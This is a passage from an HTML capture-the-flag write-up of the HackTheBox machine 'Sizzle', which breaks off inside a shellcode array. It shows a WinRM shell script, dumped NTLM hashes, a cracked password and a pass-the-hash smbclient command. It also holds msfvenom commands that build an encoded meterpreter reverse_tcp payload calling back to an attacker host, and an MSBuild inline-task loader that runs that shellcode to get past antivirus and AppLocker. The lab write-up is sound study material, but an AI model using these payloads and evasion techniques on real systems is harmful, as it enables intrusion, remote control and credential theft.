&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:powershell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;until&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;exit&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&amp;gt; ')&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chomp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;gets&lt;/span&gt;        
        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;STDOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;STDERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;    
    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Exiting with code &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exitcode&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-it-worked-&quot;&gt;And it worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-there-was-no-usertxt-&quot;&gt;But there was no &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;stored-ntlm-hashes-secretsdump-privilege-escalation&quot;&gt;Stored NTLM Hashes, Secretsdump, Privilege Escalation&lt;/h3&gt;
&lt;h4 id=&quot;through-the-filesystem-enumeration-i-found-a-file-called-filetxt-in-cwindowssystem32-that-file-had-ntlm-hashes-for-all-users-&quot;&gt;Through the filesystem enumeration I found a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;file.txt&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32&lt;/code&gt;. That file had NTLM hashes for all users !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::

Domain    User  ID  Hash
------    ----  --  ----
HTB.LOCAL Guest 501 -   
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrb3n:1105:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;honestly-i-dont-know-how-did-that-get-there-after-resetting-the-machine-the-file-was-still-there-i-dont-know-if-the-creator-made-an-unintended-mistake-but-anyway-lets-see-how-can-we-use-that&quot;&gt;Honestly I don’t know how did that get there, After resetting the machine the file was still there. I don’t know if the creator made an unintended mistake but anyway let’s see how can we use that.&lt;/h4&gt;
&lt;h4 id=&quot;that-administrator-hash-was-useless-i-tried-it-with-smb-i-cracked-it-tried-psexec-it-didnt-work-i-cracked-mrlkys-hash-&quot;&gt;That Administrator hash was useless, I tried it with &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;, I cracked it, tried &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt;. It didn’t work. I cracked &lt;code class=&quot;highlighter-rouge&quot;&gt;mrlky&lt;/code&gt;’s hash :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-password-was-football7-i-used-it-with-secretsdumppy-from-impacket-and-got-another-administrators-hash-&quot;&gt;The password was &lt;code class=&quot;highlighter-rouge&quot;&gt;Football#7&lt;/code&gt;, I used it with &lt;code class=&quot;highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;impacket&lt;/code&gt; and got another Administrator’s hash :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-was-uncrackable-i-tried-psexec-metasploit-module-and-for-some-reason-it-didnt-work-so-i-used-the-hash-with-smb-to-access-c-then-i-downloaded-the-flags&quot;&gt;It was uncrackable, I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;metasploit&lt;/code&gt; module and for some reason it didn’t work so I used the hash with &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; to access &lt;code class=&quot;highlighter-rouge&quot;&gt;C$&lt;/code&gt; then I downloaded the flags.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient //sizzle.htb/C$ -U &quot;Administrator&quot; --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/30.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-forget-that-we-saw-that-lets-try-something-more-realistic&quot;&gt;Now forget that we saw that, Let’s try something more realistic.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;backtrack&quot;&gt;Backtrack&lt;/h3&gt;
&lt;h4 id=&quot;back-to-the-winrm-session-as-amanda-lets-examine-our-environment&quot;&gt;Back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; session as &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;, let’s examine our environment.&lt;/h4&gt;
&lt;h4 id=&quot;there-was-applocker-&quot;&gt;There was AppLocker :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;antivirus-&quot;&gt;Antivirus :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-were-even-in-constrained-language-mode-in-powershell-&quot;&gt;We were even in Constrained Language Mode in PowerShell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;since-this-was-an-active-directory-environment-i-wanted-to-do-kerberoasting-but-invoke-kerberoastps1-needed-full-language-mode-i-couldnt-use-getuserspnspy-because-the-services-were-internal-only-and-my-attempts-to-evade-the-antivirus-failed-i-could-bypass-the-constrained-language-mode-with-psbypassclm-and-still-couldnt-use-invoke-kerberoastps1-applocker-is-easy-to-bypass-so-it-wasnt-an-issue-but-i-had-to-bypass-the-antivirus&quot;&gt;Since this was an Active Directory environment I wanted to do kerberoasting, but &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Kerberoast.ps1&lt;/code&gt; needed Full Language Mode, I couldn’t use &lt;code class=&quot;highlighter-rouge&quot;&gt;GetUserSPNs.py&lt;/code&gt; because the services were internal only. And my attempts to evade the antivirus failed. I could bypass the constrained language mode with &lt;a href=&quot;https://github.com/padovah4ck/PSByPassCLM&quot;&gt;PSByPassCLM&lt;/a&gt; and still couldn’t use &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Kerberoast.ps1&lt;/code&gt;. AppLocker is easy to &lt;a href=&quot;https://github.com/api0cradle/UltimateAppLockerByPassList&quot;&gt;bypass&lt;/a&gt; so it wasn’t an issue. But I had to bypass the antivirus.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;bypassing-av&quot;&gt;Bypassing AV&lt;/h3&gt;
&lt;h4 id=&quot;i-found-this-article-and-this-poc&quot;&gt;I found &lt;a href=&quot;https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/&quot;&gt;this article&lt;/a&gt; and this &lt;a href=&quot;https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml&quot;&gt;POC&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;first-time-i-created-the-payload-like-this-&quot;&gt;First time I created the payload like this :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -f csharp&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-i-added-the-shellcode-to-the-poc-and-applied-the-exploit-&quot;&gt;And I added the shellcode to the POC and applied the exploit :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\windows\system32\spool\drivers\color\shellcode.xml&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-antivirus-detected-it-i-added-an-encoder-and-100-iterations-and-tried-again-&quot;&gt;The antivirus detected it. I added an encoder and 100 iterations and tried again :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -e x86/shikata_ga_nai -i 100 -f csharp&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-added-the-shellcode-to-shellcodexml&quot;&gt;Then I added the shellcode to &lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode.xml&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;shellcodexml-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode.xml&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&amp;gt;
  &amp;lt;!-- This inline task executes shellcode. --&amp;gt;
  &amp;lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&amp;gt;
  &amp;lt;!-- Save This File And Execute The Above Command --&amp;gt;
  &amp;lt;!-- Author: Casey Smith, Twitter: @subTee --&amp;gt; 
  &amp;lt;!-- License: BSD 3-Clause --&amp;gt;
  &amp;lt;Target Name=&quot;Hello&quot;&amp;gt;
    &amp;lt;ClassExample /&amp;gt;
  &amp;lt;/Target&amp;gt;
  &amp;lt;UsingTask
    TaskName=&quot;ClassExample&quot;
    TaskFactory=&quot;CodeTaskFactory&quot;
    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &amp;gt;
    &amp;lt;Task&amp;gt;
    
      &amp;lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&amp;gt;
      &amp;lt;![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport(&quot;kernel32&quot;)]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport(&quot;kernel32&quot;)]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport(&quot;kernel32&quot;)]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {
            byte[] shellcode = new byte[3189] {
0xb8,0xfe,0x59,0x88,0xe3,0xdd,0xc6,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0x66,
0xb9,0x17,0x03,0x31,0x43,0x14,0x83,0xc3,0x04,0x03,0xbd,0x49,0x6a,0x16,0xfb,
0x0b,0x0e,0xdf,0x65,0x10,0x07,0x06,0xed,0x83,0x6c,0xe6,0x24,0x05,0xea,0xa0,
0x39,0x96,0x70,0x15,0x41,0xa9,0x21,0x89,0x4a,0x9e,0xde,0x4f,0xd8,0x9d,0x21,
0xc8,0xc2,0xc7,0x98,0x1a,0x36,0x5c,0xec,0xe2,0xa0,0x84,0x61,0x2a,0x53,0xe7,
0x00,0x93,0xe2,0x70,0x85,0x85,0xda,0x7c,0xc7,0xc4,0x6e,0x4c,0xba,0xc5,0x5c,
0x9f,0x56,0x88,0x1d,0x4a,0xcb,0x5a,0x6f,0x86,0x40,0x46,0x26,0x80,0xf3,0x06,
0x39,0x4e,0xc2,0x43,0x48,0x82,0x98,0x06,0xa1,0x6b,0x45,0xbb,0x79,0xeb,0x4f,
0x4f,0x57,0x2f,0x6e,0x01,0xbc,0x9f,0x7b,0x2b,0xee,0x21,0x0c,0x5e,0x01,0xcf,
0xbb,0x1e,0x12,0x2f,0xf2,0xa7,0x1f,0x9c,0xa5,0x95,0x57,0x21,0x77,0xe6,0x03,
0x16,0x5a,0x09,0x8a,0x0b,0xb6,0x9f,0x70,0x88,0x1a,0xe7,0xae,0xdb,0xd4,0xc0,
0x3f,0xcd,0x53,0x49,0x21,0x97,0x7d,0xce,0xca,0x85,0xd8,0x94,0x12,0x73,0x81,
0x13,0xda,0x63,0xcf,0xa8,0x77,0xfa,0xa4,0x96,0xc8,0x18,0x2a,0xad,0x04,0xa8,
0x56,0xfc,0x6c,0x89,0xef,0x15,0xff,0xc1,0xa5,0x4b,0xb4,0xa4,0x3c,0xbc,0xf6,
0xeb,0x10,0x99,0xaa,0x81,0x73,0x33,0x5d,0xc9,0x5c,0x71,0x8f,0x45,0x30,0x6e,
0x8b,0x3a,0xc2,0x2d,0x09,0x7e,0x0f,0x34,0xea,0xb5,0x4b,0xfd,0x39,0x97,0x8b,
0xe1,0xb8,0x31,0xaa,0xe9,0xe1,0x0c,0x0f,0xda,0x49,0x1b,0xfd,0xf4,0x82,0x3c,
0x80,0x00,0x81,0x42,0x30,0xdf,0xe4,0x9f,0x9f,0xa9,0xa7,0x6e,0x27,0xe5,0x32,
0xf6,0x4b,0x90,0x52,0xb7,0x53,0xa2,0x5a,0xc2,0x47,0xdf,0x10,0x67,0x38,0xab,
0xbe,0x8b,0x34,0xa1,0x86,0x39,0x3e,0x16,0x6c,0xbc,0xcf,0x4f,0x17,0x30,0x1d,
0xa7,0x55,0x35,0x8b,0x51,0xeb,0xdc,0x78,0xac,0xed,0x41,0x75,0xdb,0x91,0x08,
0x4b,0x0f,0x32,0xd6,0x0c,0x16,0xa5,0xca,0x80,0xd3,0xad,0x44,0x7d,0x86,0x09,
0xf1,0xcd,0x9c,0x65,0x7c,0xff,0xc7,0x2b,0x90,0xa6,0xd0,0x38,0xb1,0x57,0x7f,
0xcb,0x98,0xec,0xee,0x22,0x96,0x5f,0xcf,0xca,0x2e,0x1f,0x2e,0x6a,0x63,0x27,
0x74,0xc2,0xe1,0xed,0x8c,0x87,0x98,0x2e,0xb6,0x9f,0x28,0x64,0x07,0xa7,0xda,
0x51,0x56,0x05,0xa5,0x4e,0xcf,0xd5,0x9a,0x39,0x76,0x51,0x2c,0xd3,0x32,0xbf,
0x47,0x5d,0xee,0xa6,0xd9,0xa1,0x6c,0xd6,0x73,0x5f,0x76,0x63,0x14,0xcf,0xb2,
0x6f,0x66,0x82,0xe7,0x96,0xdf,0x25,0x21,0x24,0x12,0x71,0x68,0x42,0xf1,0xdd,
0xa9,0x8a,0xe0,0xd4,0xaa,0x4e,0x10,0x68,0xe0,0x84,0x76,0xe0,0xf4,0x63,0x93,
0x74,0x1c,0xa6,0x4d,0x27,0x5b,0x79,0xfd,0x82,0x64,0x0a,0xbd,0xf0,0x37,0xf1,
0xd3,0xb7,0x7f,0x0a,0x39,0x8f,0x26,0x24,0x1f,0x4b,0xc4,0x34,0x73,0xc2,0xd1,
0xab,0x70,0x2d,0x65,0x6b,0x1c,0x1c,0x9f,0x9e,0xaf,0x13,0xbb,0xef,0x1c,0x9d,
0x64,0x53,0x39,0x17,0x00,0x0d,0x69,0x4b,0x3f,0x21,0x2f,0x7c,0xcb,0xe3,0xf7,
0x53,0x75,0xc2,0xa2,0x26,0x58,0xc5,0x37,0x94,0x32,0xc1,0x4d,0xa0,0x67,0xa3,
0xad,0x16,0x0d,0xd7,0xd8,0x85,0x78,0xc3,0xcf,0x4c,0x2b,0x95,0x45,0x2c,0xbf,
0x60,0x2b,0x26,0x49,0x29,0xbc,0xa6,0xce,0xde,0xed,0xf3,0x01,0x41,0xee,0xa1,
0xbd,0x05,0x2d,0xd7,0x7e,0xd7,0xcc,0xd9,0x22,0x2e,0x0d,0x22,0x51,0xc5,0xfa,
0x6c,0x6c,0xfa,0xab,0x0e,0x2f,0x3a,0x01,0xdc,0x2d,0xaa,0xf8,0x3d,0x88,0xd4,
0xfe,0xa0,0xd5,0x19,0x7c,0x76,0x0d,0x87,0xd1,0x4d,0x50,0x4a,0x48,0xd2,0xd1,
0xcf,0x38,0xbb,0xac,0xf4,0xd2,0x8a,0x2a,0x1e,0x0a,0x5b,0x84,0xdd,0x4a,0x70,
0x16,0xaa,0x0d,0x9d,0xb3,0xc1,0x6f,0x8d,0x36,0x7d,0xd0,0xec,0x19,0xd1,0xcb,
0x8b,0x93,0xd4,0x27,0x3e,0x8d,0x01,0x02,0xb8,0x49,0x7f,0xb5,0x70,0xeb,0xa9,
0xe9,0xc5,0xf1,0xac,0x08,0xab,0x3d,0xfa,0xa5,0x07,0x31,0x03,0x33,0x00,0xf9,
0xf6,0x12,0xfb,0x10,0x59,0x64,0x60,0x81,0xf5,0x60,0xf7,0x14,0xd9,0xdf,0x72,
0xe2,0x20,0xfb,0x4a,0x1d,0xf1,0x58,0x1b,0x12,0x36,0x2d,0x3c,0x8d,0xc0,0xa8,
0x28,0x57,0x0b,0x9b,0x1c,0x05,0x26,0x07,0x86,0xe2,0x85,0x8a,0xa1,0x6a,0x6d,
0x28,0x0f,0x18,0x84,0x0f,0xe1,0xf2,0xff,0x32,0xab,0x0c,0x12,0x33,0x5b,0xca,
0x72,0x4b,0x9e,0x14,0x2d,0xeb,0x59,0xed,0x4f,0x3b,0xef,0x43,0x7c,0x99,0xdc,
0x08,0x35,0x76,0x45,0xd9,0x16,0x76,0xc6,0xb7,0x7f,0xa4,0xaf,0x03,0x87,0x91,
0x27,0x10,0x9b,0x99,0x2b,0xb3,0xe1,0xca,0x5d,0xee,0x45,0x60,0x34,0x44,0x2c,
0x1c,0x9c,0x5e,0x13,0x15,0x16,0x50,0x56,0xec,0x17,0xd7,0x38,0xaa,0xb3,0x2c,
0xc5,0xea,0x32,0x7e,0x25,0x1f,0xd6,0x95,0x1d,0xa3,0x44,0xbf,0x8c,0x53,0x3b,
0x06,0xcf,0x1a,0x46,0x75,0x54,0x01,0x76,0x39,0x33,0x7a,0x55,0x5a,0x48,0xe5,
0xe4,0xad,0x6c,0x65,0x6b,0x12,0x2a,0xe7,0xbe,0x8f,0x4f,0x33,0x19,0xd4,0x31,
0xac,0x4f,0x11,0xcc,0x18,0xe7,0x61,0x44,0x7b,0xa8,0x9c,0x6b,0xd1,0xdf,0x35,
0xb1,0xbf,0x15,0x78,0x57,0x02,0x73,0x92,0x23,0x32,0x92,0xb1,0xe6,0xe4,0x2d,
0x09,0x42,0xea,0xcd,0x05,0x3e,0x04,0xe7,0x83,0xc0,0xfa,0x89,0x68,0x0c,0x49,
0xec,0x8f,0x42,0x88,0xe5,0xbe,0xbe,0xe2,0x09,0xc1,0x0f,0x60,0xb7,0x7f,0x47,
0xf1,0xc8,0x7c,0xbf,0x22,0x8d,0x28,0x5b,0x0d,0x1f,0xb4,0xa9,0x46,0xea,0x5c,
0x48,0x0a,0x00,0x66,0xc6,0x55,0xcc,0x7e,0x34,0xe7,0x19,0xd3,0x77,0x95,0x8c,
0x0d,0x2d,0x47,0x3a,0xb5,0x79,0x14,0x92,0x80,0xd2,0xb4,0x8a,0xad,0x1b,0x7a,
0x94,0xa2,0x5a,0xc1,0x95,0xf0,0x0b,0x7d,0x75,0x6e,0x2f,0x34,0x3f,0x2f,0xeb,
0xca,0x4e,0x35,0x71,0x5f,0x41,0x45,0x0f,0x76,0x3f,0x13,0x67,0xe3,0x73,0xba,
0xb0,0xa5,0x92,0x44,0x32,0x0d,0x61,0x2b,0xee,0x57,0xef,0x76,0xeb,0xd5,0x99,
0x92,0xff,0xec,0xf5,0x88,0xa0,0xd3,0xfc,0xec,0xbf,0xcd,0x31,0xf3,0x40,0x63,
0xeb,0xc8,0xc6,0x74,0xc1,0xe5,0xf3,0xf2,0x1a,0x21,0x5f,0xef,0x8a,0x3c,0x3e,
0x96,0x78,0xb7,0xdf,0xc2,0x4c,0xf3,0x73,0xee,0x5d,0xe6,0x28,0x93,0xe4,0xd5,
0x8f,0x03,0xf7,0xe9,0x62,0x17,0xfc,0xec,0x5e,0x7e,0xc7,0x52,0x10,0x8a,0x0d,
0x21,0xf8,0xd2,0x4e,0x74,0xbe,0x8c,0x6b,0x15,0x28,0xa7,0x41,0xc5,0x74,0x15,
0x1d,0xa5,0x33,0x8a,0x06,0xa1,0x93,0xc0,0xe9,0x8a,0x62,0x1c,0x45,0x63,0xaa,
0xd6,0x09,0x8d,0xd6,0xd9,0xac,0x2f,0x98,0xcc,0xdc,0xa2,0x11,0x5e,0x39,0xb6,
0xcf,0x00,0xc9,0xb1,0x55,0xad,0x39,0x0a,0xb3,0xa1,0x66,0x43,0x8f,0x5d,0xbd,
0x57,0x37,0xc8,0xb2,0xa9,0x05,0xe2,0xaa,0xa7,0x6c,0x48,0xce,0x31,0x91,0xd6,
0x04,0xb9,0x7b,0xcd,0xe0,0x6d,0x82,0x16,0x8e,0x4b,0x20,0x87,0x82,0x00,0x37,
0x3e,0xf0,0x31,0x27,0xe4,0xd2,0xa8,0x90,0x54,0x99,0x98,0xaa,0xab,0xea,0x08,
0xad,0xa6,0xf9,0x18,0x57,0x52,0xdf,0xa6,0xf0,0x0c,0x5b,0xa8,0x6a,0xed,0x18,
0xd8,0x0d,0x41,0x42,0x7d,0x30,0x4d,0x73,0x8b,0x1b,0x3a,0x10,0xb8,0xcf,0x8d,
0x55,0xbb,0x25,0x1e,0x2f,0x15,0xc6,0x7b,0x64,0x64,0x99,0x3e,0xc7,0x1c,0xb1,
0xf8,0x18,0x26,0x5e,0x42,0xeb,0x20,0xbd,0xcb,0x55,0x00,0x8a,0xe0,0x83,0xa0,
0x81,0xd5,0x92,0x50,0xcb,0x79,0x40,0xde,0x15,0x1c,0x19,0x32,0x3b,0xc2,0x3a,
0x98,0x1a,0x07,0x92,0xbc,0x49,0x4a,0x93,0x55,0xf2,0x31,0x73,0x80,0x2a,0x92,
0x25,0xf4,0xac,0xeb,0xc8,0xe6,0x9b,0x08,0x9c,0x8a,0x51,0x64,0x4c,0xd0,0x22,
0x88,0x0e,0xba,0x96,0x7e,0x6a,0x45,0x7b,0x3d,0x78,0xfe,0xd1,0xdd,0x25,0x4c,
0x50,0xa1,0x24,0x55,0xae,0x7d,0xe7,0x2f,0xbd,0xb8,0x82,0x6e,0xe8,0x97,0x1a,
0x56,0x3f,0x52,0x42,0xc6,0x07,0x66,0x32,0xf8,0x60,0xe5,0x91,0x98,0x30,0x3b,
0x2a,0xe9,0x47,0xb0,0x04,0x65,0x6a,0x8d,0x55,0xac,0x60,0xe2,0xd6,0xc6,0x68,
0x26,0xfe,0x18,0x5b,0x3c,0xe2,0x6b,0x20,0x40,0x31,0x05,0xd1,0xec,0x84,0x2c,
0x60,0x31,0xce,0x4a,0x77,0xcb,0xec,0x95,0x88,0x78,0x0b,0x12,0x71,0x9f,0x98,
0x91,0x67,0x8d,0xb1,0x29,0xab,0xb4,0xd7,0xb8,0x73,0x67,0xa2,0x3f,0xc8,0xcf,
0x3b,0x5c,0xbd,0x62,0x69,0x6b,0x41,0x59,0x0c,0x05,0xae,0xb2,0xf3,0xb4,0xe4,
0x66,0x60,0x9f,0xa3,0xb6,0x90,0xb8,0xe6,0x1a,0x19,0xa5,0x99,0x22,0xcf,0xca,
0xa5,0xe9,0xc1,0x64,0x30,0xce,0x4f,0x85,0xfe,0x7f,0xe4,0x0a,0x07,0xa0,0x58,
0xcb,0x5e,0xcf,0x26,0x03,0xac,0x71,0x0e,0xdd,0x1c,0x0d,0x32,0xa5,0x9f,0x44,
0x2f,0xeb,0xfd,0xad,0x69,0x5c,0x29,0x11,0x72,0x1b,0xd7,0x48,0xea,0x40,0xd3,
0xc0,0x4d,0xc2,0x22,0x15,0x9b,0x33,0x64,0x47,0xab,0x90,0x22,0x90,0x0b,0x01,
0x12,0x87,0x40,0x76,0x18,0x3f,0xec,0x40,0xd3,0xba,0x86,0xc6,0x76,0x3d,0xbb,
